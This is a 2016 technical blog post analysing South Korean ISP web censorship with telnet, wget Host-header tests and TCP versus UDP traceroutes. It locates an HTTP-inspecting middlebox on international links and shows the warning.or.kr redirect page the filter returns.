<p>Wikipedia lists a short list of websites forbidden to visit in South Korea, but I used
<a href="https://github.com/aredo/porn-site-list/blob/master/sites.json">https://github.com/aredo/porn-site-list/blob/master/sites.json</a> to get a list of potentially banned websites (a lot of them are actually blocked) in South Korea.</p>
<p>As you see, quite a large number of websites are currently blocked. They include the websites that are considered containing "socially harmful" or subversive contents such as adult or gambling websites as well as political matters notably related to North Korea. Social medias are very much censored too (online comments are massively removed).</p>
<p>This research excludes any politically sensitive items as this analysis is intended to be limited to a technical side and I am not making any political judgment. I am trying, from an external point of view, to evaluate the technical level of the current censorship system. Social medias are out of scope of this analysis. </p>
<p>This study was done in September 2016 using 3 major ISPs: KT, SK Telecom (SKT) and LG U+.</p>
<p><a id="first-contact"></a></p>
<h2>1. First contact with the censorship system</h2>
<p>We will use <code>telnet</code> to understand how the censorship system works.</p>
<p>If you go on a censored website, you will see this webpage:
<img alt="" src="images/2016-censorship-www.warning.or.kr.png" /></p>
<p>Let's dig:</p>
<p>A standard (and very basic) HTTP request is:</p>
<pre><code>GET / HTTP/1.1
Host: www.remote-server.com\r\n\r\n
</code></pre>
<p>Trying this on a censored website:</p>
<pre><code>user@kali:~$ telnet xhamster.com 80
Trying 88.208.29.24...
Connected to www.xhamster.com.
Escape character is '^]'.
GET / HTTP/1.1
Host: xhamster.com

HTTP/1.0 302 Redirect
Location: http://www.warning.or.kr
user@kali:~$
</code></pre>
<p>By changing the <code>Host</code> value to a banned website, it seems we can trigger the censorship system:</p>
<pre><code>user@kali:~$ telnet xhamster.com 80
Trying 88.208.29.24...
Connected to www.xhamster.com.
Escape character is '^]'.
GET / HTTP/1.1
Host: wutwut

HTTP/1.1 301 Moved Permanently
Server: nginx
Date: Fri, 01 Oct 2016 00:00:00 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
Location: http://xhamster.com/
user@kali:~$
</code></pre>
<p>This request seems to work and the Nginx server from <code>xhamster.com</code> will reply to us. So, at least, the censorship system is analyzing the <code>Host</code> header in the HTTP request.</p>
<p><a id="locating-the-censorship-system"></a></p>
<h2>2. Locating the censorship system in the networks</h2>
<p>We will use <code>wget</code> to customize the request in order to understand where is the filtering process.</p>
<p>We ask the Google.ru webpage (note: I made a configuration to ensure www.google.ru resolves to a Google server not located in South Korea. <code>216.58.214.131</code> is located in Europe).</p>
<p>I, then, will use Google servers located in South Korea to see if the censorship is really analyzing every Host header on every HTTP connection or only targeting a few IPs.</p>
<p>We will eventually determine where this censorship system is located.</p>
<p>We are doing a name resolution to get a Google server outside South Korea:</p>
<pre><code>user@kali:~$ host google.ru 8.8.8.8
Using domain server:
Name: 8.8.8.8
Address: 8.8.8.8#53
Aliases:

google.ru has address 216.58.197.227
google.ru has IPv6 address 2404:6800:4005:802::2003
google.ru mail is handled by 50 alt4.aspmx.l.google.com.
google.ru mail is handled by 30 alt2.aspmx.l.google.com.
google.ru mail is handled by 20 alt1.aspmx.l.google.com.
google.ru mail is handled by 10 aspmx.l.google.com.
google.ru mail is handled by 40 alt3.aspmx.l.google.com.
user@kali:~$
user@kali:~$  traceroute -n 216.58.197.227
traceroute to 216.58.197.227 (216.58.197.227), 30 hops max, 60 byte packets
1  100.114.55.252  3.915 ms  4.052 ms  4.495 ms
2  100.114.27.169  4.503 ms  4.498 ms  4.495 ms
3  1.255.24.48  4.806 ms  5.027 ms  5.026 ms
4  61.98.54.109  5.380 ms  5.376 ms  5.372 ms
5  58.229.4.16  7.384 ms 58.229.4.12  13.247 ms 58.229.4.8  10.801 ms
6  118.221.7.46  9.586 ms  5.669 ms  5.596 ms
7  39.115.132.69  5.062 ms 58.229.15.213  5.038 ms 39.115.132.69  5.030 ms
8  72.14.216.77  41.280 ms 72.14.215.199  38.651 ms  38.296 ms
9  216.239.54.1  39.183 ms  39.033 ms 209.85.142.95  38.461 ms
10  209.85.142.185  43.401 ms 216.239.40.11  43.397 ms 209.85.142.185  40.657 ms
11  72.14.238.35  64.533 ms 216.58.197.227  36.478 ms  37.243 ms
user@kali:~$
</code></pre>
<p>Google.ru resolves to a foreign IP which is far away.</p>
<p>Ok let's debug:</p>
<pre><code>user@kali:~$ wget -O- http://www.google.ru/ | grep -ai google|head -n 1
--2016-10-01 XX:XX:XX--  http://www.google.ru/
Resolving www.google.ru (www.google.ru)... 216.58.214.131, 2a00:1450:4001:813::2003
Connecting to www.google.ru (www.google.ru)|216.58.214.131|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: 'STDOUT'

&lt;!doctype html&gt;&lt;html itemscope="" itemtype="http://schema.org/WebPage" lang="ru"&gt;&lt;head&gt;&lt;meta content="Google." name="description"&gt;&lt;meta content="noodp" name="robots"&gt;&lt;meta content="text/html; charset=UTF-8" http-equiv="Content-Type"&gt;&lt;meta content="/images/branding/googleg/1x/googleg_standard_color_128dp.png" itemprop="image"&gt;&lt;title&gt;Google&lt;/title&gt;&lt;script&gt;(function(){window.google={kEI:'9kbBV4mEM8nt0gSfvbGQCg',kEXPI:'3700062,3700283,3700389,4029815,4031109,4032678,4036509,4036527,4038012,4039268,4043492,4045841,4048347,4052304,4058543,4061154,4062702,4063879,4065786,4065793,4066654,4066708,4067175,4067860,4068550,4068816,4069839,4069841,4069905,4070127,4070220,4070598,4071231,4071575,4071603,4071842,4072000,4072289,4072364,4072653,4072682,4072773,4073231,4073405,4073419,4073958,4073980,4074426,4074801,4075122,4075451,4075464,4075781,4075788,4075860,4075966,4075976,4076018,4076096,4076115,4076117,4076797,4076931,4077219,4077221,4077384,4077391,8300096,8300273,8502184,8503585,8504846,8505150,8505152,8505585,8505677,8505816,8506585,10200083',authuser:0,kscs:'c9c918f0_24'};google.kHL='ru';})();(function(){google.lc=[];google.li=0;google.getEI=function(a){for(var b;a&amp;&amp;(!a.getAttribute||!(b=a.getAttribute("eid")));)a=a.parentNode;return b||google.kEI};google.getLEI=function(a){for(var b=null;a&amp;&amp;(!a.getAttribute||!(b=a.getAttribute("leid")));)a=a.parentNode;return b};google.https=function(){return"https:"==window.location.protocol};google.ml=function(){return null};google.wl=function(a,b){try{google.ml(Error(a),!1,b)}catch(c){}};google.time=function(){return(new Date).getTime()};google.log=function(a,b,c,e,g){a=google.logUrl(a,b,c,e,g);if(""!=a){b=new Image;var d=google.lc,f=google.li;d[f]=b;b.onerror=b.onload=b.onabort=function(){delete d[f]};window.google&amp;&amp;window.google.vel&amp;&amp;window.google.vel.lu&amp;&amp;window.google.vel.lu(a);b.src=a;google.li=f+1}};google.logUrl=function(a,b,c,e,g){var d="",f=google.ls||"";if(!c&amp;&amp;-1==b.search("&amp;ei=")){var h=google.getEI(e)

user@kali:~$
</code></pre>
<p>Yeah! We can access to Google.</p>
<p>Now, question: Does it work when we try to contact Google server in South Korea? (<code>1.255.22.242</code> is an IP for www.google.co.kr, located in South Korea, as shown below):</p>
<p>Google inside Korean IP space:</p>
<pre><code>user@kali:~$ host google.co.kr
google.co.kr has address 1.255.22.241
google.co.kr has address 1.255.22.237
google.co.kr has address 1.255.22.217
google.co.kr has address 1.255.22.216
google.co.kr has address 1.255.22.227
google.co.kr has address 1.255.22.251
google.co.kr has address 1.255.22.242
google.co.kr has address 1.255.22.232
google.co.kr has address 1.255.22.226
google.co.kr has address 1.255.22.247
google.co.kr has address 1.255.22.236
google.co.kr has address 1.255.22.222
google.co.kr has address 1.255.22.221
google.co.kr has address 1.255.22.212
google.co.kr has address 1.255.22.231
google.co.kr has address 1.255.22.246
google.co.kr has IPv6 address 2404:6800:400a:806::2003
google.co.kr mail is handled by 10 aspmx.l.google.com.
google.co.kr mail is handled by 40 alt3.aspmx.l.google.com.
google.co.kr mail is handled by 20 alt1.aspmx.l.google.com.
google.co.kr mail is handled by 50 alt4.aspmx.l.google.com.
google.co.kr mail is handled by 30 alt2.aspmx.l.google.com.

user@kali:~$ tcptraceroute -n 1.255.22.242 80
Running:
    traceroute -T -O info -n -p 80 1.255.22.242 
traceroute to 1.255.22.242 (1.255.22.242), 30 hops max, 60 byte packets
1  100.114.55.252  3.759 ms  4.431 ms  4.556 ms
2  100.114.27.169  4.553 ms  4.551 ms  4.547 ms
3  1.255.24.48  5.182 ms  5.668 ms  5.900 ms
4  61.98.54.109  5.900 ms  6.452 ms  6.992 ms
5  58.229.4.28  10.786 ms 58.229.4.20  12.408 ms 58.229.4.36  10.783 ms
6  58.229.4.163  10.713 ms  7.037 ms  7.370 ms
7  1.255.22.242&lt;syn,ack&gt;  6.621 ms  7.737 ms  7.798 ms
user@kali:~$ ping 1.255.22.242
PING 1.255.22.242 (1.255.22.242) 56(84) bytes of data.
64 bytes from 1.255.22.242: icmp_seq=1 ttl=58 time=4.32 ms
^C
--- 1.255.22.242 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 4.328/4.328/4.328/0.000 ms
user@kali:~$
</code></pre>
<p>4.32ms to contact <code>1.255.22.242</code>! - this IP is located in South Korea (and <code>whois 1.255.22.242</code> will confirm it - <em>SK Broadband Co Ltd</em>).</p>
<p>Fetching a webpage located at <code>1.255.22.242</code>:</p>
<pre><code>user@kali:~$ wget -O- http://1.255.22.242/ &gt;/dev/null
--2016-10-01XX:XX:XX--  http://1.255.22.242/
Connecting to 1.255.22.242:80... connected.
HTTP request sent, awaiting response... 301 Moved Permanently
Location: http://www.google.com/ [following]
--2016-10-01 XX:XX:XX--  http://www.google.com/
Resolving www.google.com (www.google.com)... 74.125.203.103, 74.125.203.105, 74.125.203.106, ...
Connecting to www.google.com (www.google.com)|74.125.203.103|:80... connected.
HTTP request sent, awaiting response... 302 Found
Location: http://www.google.co.kr/?gfe_rd=cr&amp;ei=n3nCV9PEPM-T9QWY36ywCg [following]
--2016-10-01 XX:XX:XX--  http://www.google.co.kr/?gfe_rd=cr&amp;ei=n3nCV9PEPM-T9QWY36ywCg
Resolving www.google.co.kr (www.google.co.kr)... 74.125.23.94, 2404:6800:4008:c01::5e
Connecting to www.google.co.kr (www.google.co.kr)|74.125.23.94|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: 'STDOUT'

-                                                        [ &lt;=&gt;]  10.78K  --.-KB/s    in 0.001s

2016-10-01 XX:XX:XX (7.03 MB/s) - written to stdout [11040]
</code></pre>
<p>The default webpage will give us a 302 Redirect to <code>http://www.google.co.kr/</code>.</p>
<p>We can access to Google servers located in South Korea too!</p>
<p>Now, we know that browsing the <code>www.xhamster.com</code> webpage will show the <code>warning.or.kr</code> webpage from the first part.</p>
<p>We can forge the Host header in the HTTP request to understand where the censorship system is located.</p>
<p>Asking a Google webpage on a Google server located outside South Korea with a custom header with a banned Host (<code>Host: www.xhamster.com</code>):</p>
<pre><code>user@kali:~$ wget -O- --header="Host: www.xhamster.com" http://www.google.ru/
--2016-10-01XX:XX:XX--  http://www.google.ru/
Resolving www.google.ru (www.google.ru)... 216.58.214.131, 2a00:1450:4001:813::2003
Connecting to www.google.ru (www.google.ru)|216.58.214.131|:80... connected.
HTTP request sent, awaiting response... 302 Redirect
Location: http://www.warning.or.kr [following]
--2016-10-01 XX:XX:XX--  http://www.warning.or.kr/
Resolving www.warning.or.kr (www.warning.or.kr)... 121.189.57.82
Connecting to www.warning.or.kr (www.warning.or.kr)|121.189.57.82|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10590 (10K) [text/html]
Saving to: 'STDOUT'

-                             0%[                                            ]       0  --.-KB/s               &lt;html&gt;
&lt;head&gt;
&lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8"&gt;
&lt;meta name="kcsc" content="blocking" /&gt;
&lt;title&gt;www.warning.or.kr&lt;/title&gt;
&lt;style type="text/css"&gt;
[...]

user@kali:~$
</code></pre>
<p>This request is blocked (see the 302 direction to <code>http://www.warning.or.kr/</code>).</p>
<p>As seen before, we have access to Google servers located inside and outside South Korea.</p>
<p>If I try to contact a Google server located outside South Korea and ask for a custom censored host, then the request seems to be censored.</p>
<p>However, if I ask a Google server located in South Korea to provide me with a banned website, this request will work and Google will provide a reply, as shown below.</p>
<p>Asking <code>www.xhamster.com</code> on a Google Korean Server will result a 404 page from Google (that is, <strong>this request is NOT blocked by the censorship system</strong>):</p>
<pre><code>user@kali:~$ wget -O- --header="Host: www.xhamster.com" http://1.255.22.242/
--2016-10-01XX:XX:XX--  http://1.255.22.242/
Connecting to 1.255.22.242:80... connected.
HTTP request sent, awaiting response... 404 Not Found
2016-10-01   XX:XX:XX ERROR 404: Not Found.
user@kali:~$
</code></pre>
<p>Using telnet for the same request (in HTTP/1.0):</p>
<pre><code>user@kali:~$ telnet 1.255.22.242 80
Trying 1.255.22.242...
Connected to 1.255.22.242.
Escape character is '^]'.
GET / HTTP/1.0
Host: www.xhamster.com

HTTP/1.0 404 Not Found
Content-Type: text/html; charset=UTF-8
Content-Length: 1561
Date: Fri, 01 Oct 2016 00:00:00 GMT

&lt;!DOCTYPE html&gt;
&lt;html lang=en&gt;
&lt;meta charset=utf-8&gt;
&lt;meta name=viewport content="initial-scale=1, minimum-scale=1, width=device-width"&gt;
&lt;title&gt;Error 404 (Not Found)!!1&lt;/title&gt;
&lt;style&gt;
    *{margin:0;padding:0}html,code{font:15px/22px arial,sans-serif}html{background:#fff;color:#222;padding:15px}body{margin:7% auto 0;max-width:390px;min-height:180px;padding:30px 0 15px}* &gt; body{background:url(//www.google.com/images/errors/robot.png) 100% 5px no-repeat;padding-right:205px}p{margin:11px 0 22px;overflow:hidden}ins{color:#777;text-decoration:none}a img{border:0}@media screen and (max-width:772px){body{background:none;margin-top:0;max-width:none;padding-right:0}}#logo{background:url(//www.google.com/images/branding/googlelogo/1x/googlelogo_color_150x54dp.png) no-repeat;margin-left:-5px}@media only screen and (min-resolution:192dpi){#logo{background:url(//www.google.com/images/branding/googlelogo/2x/googlelogo_color_150x54dp.png) no-repeat 0% 0%/100% 100%;-moz-border-image:url(//www.google.com/images/branding/googlelogo/2x/googlelogo_color_150x54dp.png) 0}}@media only screen and (-webkit-min-device-pixel-ratio:2){#logo{background:url(//www.google.com/images/branding/googlelogo/2x/googlelogo_color_150x54dp.png) no-repeat;-webkit-background-size:100% 100%}}#logo{display:inline-block;height:54px;width:150px}
&lt;/style&gt;
&lt;a href=//www.google.com/&gt;&lt;span id=logo aria-label=Google&gt;&lt;/span&gt;&lt;/a&gt;
&lt;p&gt;&lt;b&gt;404.&lt;/b&gt;&lt;ins&gt;That's an error.&lt;/ins&gt;
&lt;p&gt;The requested URL &lt;code&gt;/&lt;/code&gt; was not found on this server.  &lt;ins&gt;That's all we know.&lt;/ins&gt;
Connection closed by foreign host.
user@kali:~$
</code></pre>
<p>But asking <code>www.xhamster.com</code> on a foreign server will result a 302 redirect to <code>www.warning.or.kr</code>:</p>
<pre><code>user@kali:~$ wget -O- --header="Host: www.xhamster.com" http://www.google.com/
--2016-10-01XX:XX:XX--  http://www.google.com/
Resolving www.google.com (www.google.com)... 64.233.188.94, 2404:6800:4005:800::2003
Connecting to www.google.com (www.google.com)|64.233.188.94|:80... connected.
HTTP request sent, awaiting response... 302 Redirect
Location: http://www.warning.or.kr [following]
--2016-10-01 XX:XX:XX--  http://www.warning.or.kr/
Resolving www.warning.or.kr (www.warning.or.kr)... ^C
user@kali:~$
</code></pre>
<p><strong>From this, we can assume the filtering system only targets HTTP connections from international links.</strong></p>
<p>Let's do a traceroute and a TCPtraceroute to find out what is happening.</p>
<p>Using SKT connections, UDP traceroute to <code>www.xhamster.com</code>:</p>
<pre><code>user@kali:~$ traceroute www.xhamster.com    
traceroute to www.xhamster.com (88.208.29.24), 30 hops max, 60 byte packets
 1  100.114.55.252 (100.114.55.252)  2.803 ms  3.910 ms  4.871 ms
 2  100.114.27.169 (100.114.27.169)  4.863 ms  5.679 ms  6.116 ms
 3  1.255.24.48 (1.255.24.48)  6.121 ms  6.611 ms  7.979 ms
 4  61.98.54.109 (61.98.54.109)  8.227 ms  8.713 ms  8.709 ms
 5  58.229.4.32 (58.229.4.32)  9.056 ms 58.229.4.12 (58.229.4.12)  15.861 ms  15.868 ms
 6  118.221.7.34 (118.221.7.34)  13.865 ms  6.821 ms 1.255.26.242 (1.255.26.242)  7.892 ms
 7  58.229.14.9 (58.229.14.9)  164.852 ms  162.677 ms  164.854 ms
 8  iptp.as41095.any2ix.coresite.com (206.72.210.118)  159.382 ms  159.961 ms  165.059 ms
 9  be2.r0.r328.nkf.ams.nl.iptp.net (91.194.117.128)  326.743 ms  328.153 ms  327.627 ms
10  be101.r0.r328.nkf.ams.nl.iptp.net (176.56.179.130)  324.799 ms be100.r0.r328.nkf.ams.nl.iptp.net (176.56.179.128)  328.517 ms be101.r0.r328.nkf.ams.nl.iptp.net (176.56.179.130)  325.047 ms
11  * * *
12  * * *
13  * * *
[...]
user@kali:~$
</code></pre>
<p>Now doing a TCPtraceroute to <code>www.xhamster.com</code> on port 80 shows something fishy:</p>
<pre><code>user@kali:~$ tcptraceroute www.xhamster.com 80
Running:
    traceroute -T -O info -p 80 www.xhamster.com 
traceroute to www.xhamster.com (88.208.29.24), 30 hops max, 60 byte packets
 1  100.114.55.252 (100.114.55.252)  5.047 ms  5.730 ms  6.041 ms
 2  100.114.27.169 (100.114.27.169)  6.050 ms  6.047 ms  8.086 ms
 3  1.255.24.48 (1.255.24.48)  8.099 ms  8.097 ms  8.092 ms
 4  61.98.54.109 (61.98.54.109)  8.090 ms  8.086 ms  8.082 ms
 5  58.229.4.12 (58.229.4.12)  8.079 ms 58.229.4.20 (58.229.4.20)  8.698 ms 58.229.4.12 (58.229.4.12)  14.548 ms
 6  118.221.7.46 (118.221.7.46)  9.524 ms 118.221.7.26 (118.221.7.26)  7.158 ms 1.255.26.242 (1.255.26.242)  5.676 ms
 7  39.115.132.234 (39.115.132.234)  6.989 ms  5.656 ms  6.988 ms
 8  * * *
 9  * * *
10  192.168.112.1 (192.168.112.1)  13.741 ms  14.491 ms  16.793 ms
11  39.115.132.233 (39.115.132.233)  6.942 ms  6.935 ms  5.209 ms
12  58.229.14.9 (58.229.14.9)  312.169 ms  312.143 ms  312.145 ms
13  iptp.as41095.any2ix.coresite.com (206.72.210.118)  312.111 ms  307.172 ms  309.766 ms
14  be2.r0.r328.nkf.ams.nl.iptp.net (91.194.117.128)  337.794 ms  337.775 ms  337.779 ms
15  be100.r0.r328.nkf.ams.nl.iptp.net (176.56.179.128)  337.777 ms  337.775 ms be101.r0.r328.nkf.ams.nl.iptp.net (176.56.179.130)  329.002 ms
16  88.208.29.24 (88.208.29.24) &lt;syn,ack&gt;  317.332 ms  312.113 ms  312.082 ms
user@kali:~$
</code></pre>
<p>The hop number 10 shows a RCF1918 IP (<code>192.168.112.1</code>) only when doing a traceroute using TCP.</p>
<p>Let's target another website (<code>www.ovh.com</code>, a big European ISP):</p>
<pre><code>user@kali:~$ tcptraceroute www.ovh.com 80
Running:
    traceroute -T -O info -p 80 www.ovh.com 
traceroute to www.ovh.com (198.27.92.1), 30 hops max, 60 byte packets
 1  100.114.55.252 (100.114.55.252)  1.750 ms  1.996 ms  2.272 ms
 2  100.114.27.169 (100.114.27.169)  3.064 ms  3.070 ms  3.067 ms
 3  1.255.24.48 (1.255.24.48)  12.399 ms  13.106 ms  13.552 ms
 4  61.98.54.109 (61.98.54.109)  4.066 ms  4.321 ms  4.568 ms
 5  58.229.4.8 (58.229.4.8)  6.992 ms  6.999 ms 58.229.4.20 (58.229.4.20)  5.160 ms
 6  1.255.26.254 (1.255.26.254)  6.987 ms 118.221.7.42 (118.221.7.42)  5.064 ms 118.221.7.70 (118.221.7.70)  7.499 ms
 7  39.115.132.238 (39.115.132.238)  7.452 ms  7.457 ms  7.454 ms
 8  * * *
 9  * * *
10  192.168.112.1 (192.168.112.1)  7.414 ms 192.168.132.1 (192.168.132.1)  7.410 ms  7.407 ms
11  39.115.132.237 (39.115.132.237)  7.843 ms  7.824 ms  6.593 ms
12  39.115.132.90 (39.115.132.90)  60.029 ms 210.180.97.9 (210.180.97.9)  58.820 ms  59.904 ms
13  * * *
14  be1-1170.sbg-g1-a9.fr.eu (37.187.232.86)  308.407 ms  308.406 ms  308.404 ms
15  * po99-1123.mil-5-6k.it.eu (91.121.131.149)  308.365 ms po97-1122.mil-5-6k.it.eu (91.121.131.147)  308.171 ms
16  www.ovh.com (198.27.92.1) &lt;syn,ack&gt;  308.370 ms *  308.316 ms
user@kali:~$
</code></pre>
<p><code>192.168.112.1</code> is present (but it's NOT present if we do ICMP/UDP traceroutes).</p>
<p>Another TCPtraceroute will show a suspicious <code>192.168.132.1</code> in hop 10 (in a different date):</p>
<pre><code>user@kali:~$ tcptraceroute www.ovh.com 80
    Running:
    traceroute -T -O info -p 80 www.ovh.com 
traceroute to www.ovh.com (198.27.92.1), 30 hops max, 60 byte packets
 1  100.114.55.252 (100.114.55.252)  1.611 ms  2.138 ms  2.676 ms
 2  100.114.27.169 (100.114.27.169)  2.690 ms  2.677 ms  2.674 ms
 3  1.255.24.48 (1.255.24.48)  2.833 ms  3.128 ms  3.419 ms
 4  61.98.54.109 (61.98.54.109)  3.427 ms  3.420 ms  3.414 ms
 5  58.229.4.20 (58.229.4.20)  3.982 ms 58.229.4.16 (58.229.4.16)  5.237 ms  5.247 ms
 6  118.221.7.70 (118.221.7.70)  5.666 ms  6.473 ms  4.136 ms
 7  39.115.132.238 (39.115.132.238)  5.232 ms  5.449 ms  5.450 ms
 8  * * *
 9  * * *
10  192.168.132.1 (192.168.132.1)  5.971 ms  5.373 ms  4.869 ms
11  39.115.132.237 (39.115.132.237)  7.897 ms 39.115.132.233 (39.115.132.233)  5.352 ms 39.115.132.237 (39.115.132.237)  7.870 ms
12  39.115.132.90 (39.115.132.90)  60.661 ms  59.833 ms  59.790 ms
13  * * *
14  be1-1170.sbg-g1-a9.fr.eu (37.187.232.86)  307.206 ms  307.098 ms  308.245 ms
15  * * *
16  www.ovh.com (198.27.92.1) &lt;syn,ack&gt;  306.193 ms  306.008 ms  307.063 ms
</code></pre>
<p>With KT, sometimes, a strange hop will appear when doing a TCP traceroute, as shown below (hop 11):</p>
<pre><code>user@kali:~$ tcptraceroute 216.58.197.227
    Running:
    traceroute -T -O info -p 80 216.58.197.227
traceroute to 216.58.197.227 (216.58.197.227), 30 hops max, 60 byte packets
 1  gateway (172.30.1.254)  1.196 ms  1.197 ms  1.225 ms
 2  115.21.98.254 (115.21.98.254)  5.727 ms  7.883 ms  7.901 ms
 3  119.196.200.157 (119.196.200.157)  5.700 ms  7.305 ms  8.944 ms
 4  112.190.16.37 (112.190.16.37)  5.655 ms  6.549 ms  10.649 ms
 5  112.190.2.93 (112.190.2.93)  18.086 ms  18.105 ms  18.104 ms
 6  112.174.125.137 (112.174.125.137)  16.063 ms  3.217 ms  3.205 ms
 7  112.174.48.202 (112.174.48.202)  2.385 ms  4.605 ms  4.584 ms
 8  112.174.31.154 (112.174.31.154)  4.540 ms  6.182 ms 112.174.31.146 (112.174.31.146)  7.205 ms
 9  * * *
10  * * *
11  192.168.144.1 (192.168.144.1)  2.568 ms  2.587 ms  2.577 ms
12  112.174.31.189 (112.174.31.189)  3.301 ms 112.174.31.177 (112.174.31.177)  5.663 ms 112.174.31.25 (112.174.31.25)  15.977 ms
13  112.174.84.186 (112.174.84.186)  15.926 ms 112.174.84.58 (112.174.84.58)  15.946 ms 112.174.83.58 (112.174.83.58)  15.937 ms
14  72.14.194.194 (72.14.194.194)  46.967 ms  47.023 ms  52.190 ms
15  209.85.142.95 (209.85.142.95)  48.218 ms 216.239.54.1 (216.239.54.1)  48.857 ms 209.85.142.95 (209.85.142.95)  48.220 ms
16  72.14.237.223 (72.14.237.223)  38.998 ms 72.14.238.99 (72.14.238.99)  41.599 ms  45.584 ms
17  nrt13s49-in-f3.1e100.net (216.58.197.227) &lt;syn,ack&gt;  41.301 ms  41.277 ms  33.900 ms
</code></pre>
<p>And the UDP traceroute:</p>
<pre><code>user@kali:~$ traceroute 216.58.197.227
traceroute to 216.58.197.227 (216.58.197.227), 30 hops max, 60 byte packets
 1  gateway (172.30.1.254)  2.500 ms  2.563 ms  4.136 ms
 2  115.21.98.254 (115.21.98.254)  7.673 ms  9.465 ms  9.461 ms
 3  119.196.200.157 (119.196.200.157)  8.254 ms  9.429 ms  10.889 ms
 4  112.190.16.37 (112.190.16.37)  7.591 ms  8.242 ms  8.762 ms
 5  112.190.2.93 (112.190.2.93)  12.834 ms  12.849 ms  12.847 ms
 6  112.174.125.137 (112.174.125.137)  14.237 ms  4.237 ms  3.832 ms
 7  112.174.48.202 (112.174.48.202)  2.976 ms  2.971 ms  2.968 ms
 8  112.174.84.22 (112.174.84.22)  2.921 ms 112.174.84.58 (112.174.84.58)  3.792 ms  3.791 ms
 9  72.14.194.194 (72.14.194.194)  34.562 ms  35.805 ms  35.211 ms
10  209.85.142.95 (209.85.142.95)  36.480 ms 216.239.54.1 (216.239.54.1)  35.262 ms 209.85.142.95 (209.85.142.95)  37.717 ms
11  72.14.237.223 (72.14.237.223)  35.233 ms  35.211 ms  35.202 ms
12  nrt13s49-in-f227.1e100.net (216.58.197.227)  38.470 ms  34.080 ms  39.364 ms
</code></pre>
<p>If you read the TCPtraceroutes, you will see a hop located in the edge of the Korean network (hop10 or 11): <code>192.168.112.1</code> or <code>192.168.132.1</code> or <code>192.168.144.1</code>. This router doesn't appear when doing UDP or ICMP traceroutes.</p>
<p>When doing tcptraceroute to exotic remote ports (<code>61721</code>), this hop doesn't appear. In fact, this hop appears only for a list of specific ports (<code>80</code>, <code>8080</code>, <code>8000</code>, <code>2222</code>, ...) but the censorship seems to affect every TCP connection.</p>
<p>Note: This hop appears not every time when using KT or LG U+ connection (but they are still censoring Internet connection). It means that the 2 ISPs are using different methods to censor websites or the censorship system has different network behaviors.</p>
<p>You can test filtering by yourself with these <code>wget</code> commands, by contacting a remote server and asking to serve HTTP webpages:</p>
<p>Connecting to <code>ftp.de.freebsd.org</code> and asking HTTP on a FTP server will result errors from the FTP server (which is normal):</p>
<pre><code>user@kali:~$ wget -O- http://ftp.de.freebsd.org:21/ 
--2016-10-01 XX:XX:XX--  http://ftp.de.freebsd.org:21/
Resolving ftp.de.freebsd.org (ftp.de.freebsd.org)... 213.83.42.56, 2a02:2e0:11:a00::10
Connecting to ftp.de.freebsd.org (ftp.de.freebsd.org)|213.83.42.56|:21... connected.
HTTP request sent, awaiting response... 200 No headers, assuming HTTP/0.9
Length: unspecified
Saving to: 'STDOUT'

-                                                        [&lt;=&gt;                                                                                                                   ]       0  --.-KB/s               220 FTP Server ready.
500 GET not understood
500 USER-AGENT: not understood
500 ACCEPT: not understood
500 ACCEPT-ENCODING: not understood
500 HOST: not understood
500 CONNECTION: not understood
500 Invalid command: try being more creative
^C
user@kali:~$
</code></pre>
<p>Now connecting to the same FTP server and providing a <code>Host: www.xhamster.com</code> with the HTTP request will send us a HTTP reply by the censorship system:</p>
<pre><code>user@kali:~$ wget --header="Host: www.xhamster.com" -O- http://ftp.de.freebsd.org:21/
--2016-10-01 XX:XX:XX--  http://ftp.de.freebsd.org:21/
Resolving ftp.de.freebsd.org (ftp.de.freebsd.org)... 213.83.42.56, 2a02:2e0:11:a00::10
Connecting to ftp.de.freebsd.org (ftp.de.freebsd.org)|213.83.42.56|:21... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: 'STDOUT'

-                                                        [&lt;=&gt;                                                                                                                   ]       0  --.-KB/s               &lt;html&gt;&lt;script&gt;
var arg = "http://warning.or.kr";
var str = new Array();
str = arg.split("&amp;", 1);
var a = new Array();
a = str[0].split("=");
var b = Math.floor(a[1] / 100);
var c = new Array();
if(b == 10){location.replace("http://www.naver.com");}
else if(b == 20){location.replace("http://www.daum.net");}
else if(b == 30){location.replace("http://www.paran.com");}
else{ c = a[0].split("?");
location.replace(c[0]);}
&lt;/script&gt;&lt;/html&gt;
-                                                        [ &lt;=&gt;                                                                                                                  ]     437  --.-KB/s    in 0s

2016-10-01 XX:XX:XX (13.5 MB/s) - written to stdout [437]

user@kali:~$
</code></pre>
<p>Same with SSH:</p>
<p>We see the SSH banner on ftp.de.freebsd.org using <code>telnet</code>:</p>
<pre><code>user@kali:~$ telnet ftp.de.freebsd.org 22
Trying 213.83.42.56...
Connected to ftp.plusline.de.
Escape character is '^]'.
SSH-2.0-OpenSSH_5.3
^]
telnet&gt; q
Connection closed.
user@kali:~$
</code></pre>
<p>Now sending an http request to the sshd server of <code>ftp.de.freebsd.org</code> with a censored <code>Host</code> will trigger the censorship:</p>
<pre><code>user@kali:~$  wget --header="Host: www.xhamster.com" -O- http://ftp.de.freebsd.org:22/
--2016-10-01 XX:XX:XX--  http://ftp.de.freebsd.org:22/
Resolving ftp.de.freebsd.org (ftp.de.freebsd.org)... 213.83.42.56, 2a02:2e0:11:a00::10
Connecting to ftp.de.freebsd.org (ftp.de.freebsd.org)|213.83.42.56|:22... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: 'STDOUT'

-                                                        [&lt;=&gt;                                                                                                                   ]       0  --.-KB/s               &lt;html&gt;&lt;script&gt;
var arg = "http://warning.or.kr";
var str = new Array();
str = arg.split("&amp;", 1);
var a = new Array();
a = str[0].split("=");
var b = Math.floor(a[1] / 100);
var c = new Array();
if(b == 10){location.replace("http://www.naver.com");}
else if(b == 20){location.replace("http://www.daum.net");}
else if(b == 30){location.replace("http://www.paran.com");}
else{ c = a[0].split("?");
location.replace(c[0]);}
&lt;/script&gt;&lt;/html&gt;
-                                                        [ &lt;=&gt;                                                                                                                  ]     437  --.-KB/s    in 0s

2016-10-01 XX:XX:XX (37.8 MB/s) - written to stdout [437]
</code></pre>
